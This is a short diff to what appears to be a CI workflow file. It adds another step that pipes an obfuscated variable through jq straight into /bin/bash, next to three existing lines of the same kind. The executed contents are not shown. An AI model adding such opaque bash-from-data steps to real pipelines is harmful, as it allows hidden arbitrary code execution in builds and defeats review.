@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$p26341" | jq -r .e211 | /bin/bash
           printf '%s' "$npi850" | jq -r .y65610 | /bin/bash
           printf '%s' "$vf65" | jq -r .b1 | /bin/bash
+          echo $dk46 | jq -r .ia69137 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
